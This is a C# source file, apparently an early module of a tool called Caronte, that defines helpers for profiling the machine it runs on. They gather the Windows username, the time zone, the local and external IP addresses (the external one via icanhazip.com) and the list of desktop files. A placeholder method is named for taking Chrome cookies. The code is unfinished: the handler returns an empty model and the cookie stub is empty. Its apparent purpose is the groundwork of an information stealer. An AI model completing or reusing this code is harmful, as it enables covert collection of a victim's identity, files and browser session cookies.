using CaronteLib.Models.ClientInformation;
using MediatR;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.Sockets;
using System.Threading;
using System.Threading.Tasks;

namespace Caronte.Modules.GetClientInformation
{
    public class GetClientInformationQueryHandler : IRequestHandler<GetClientInformationQuery, ClientInformationModel>
    {
        public Task<ClientInformationModel> Handle(GetClientInformationQuery request, CancellationToken cancellationToken)
        {
            return Task.FromResult(new ClientInformationModel());
        }

        private string GetUsername()
        {
            try
            {
                return System.Security.Principal.WindowsIdentity.GetCurrent().Name;
            }
            catch
            {
                return "";
            }
        }

        private TimeZoneInfo GetCurrentTimeZoneInfo()
        {
            return TimeZoneInfo.Local;
        }

        private async Task<string> GetLocalIp()
        {
            try
            {
                var dns = await Dns.GetHostEntryAsync(Dns.GetHostName());

                foreach (var ip in dns.AddressList)
                    if (ip.AddressFamily == AddressFamily.InterNetwork)
                        return ip.ToString();

                throw new Exception("Não foi possivel resolver o host interno.");
            }
            catch
            {
                return "";
            }
        }

        private async Task<IPAddress> GetExternalIp()
        {
            try
            {
                var client = new WebClient();

                string externalIpString = await client.DownloadStringTaskAsync("http://icanhazip.com");
                return IPAddress.Parse(externalIpString);
            }
            catch
            {
                return null;
            }
        }

        private List<string> GetClientDesktopFiles()
        {
            try
            {
                var DesktopPath = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
                var files = Directory.GetFiles(DesktopPath).ToList();

                return files;
            }
            catch
            {
                return new List<string>();
            }
        }

        private byte[] GetChromeNavigatorCookie()
        {
            try
            {

            }
            catch (Exception ex)
            {

            }

            return new byte[0];
        }
    }
}
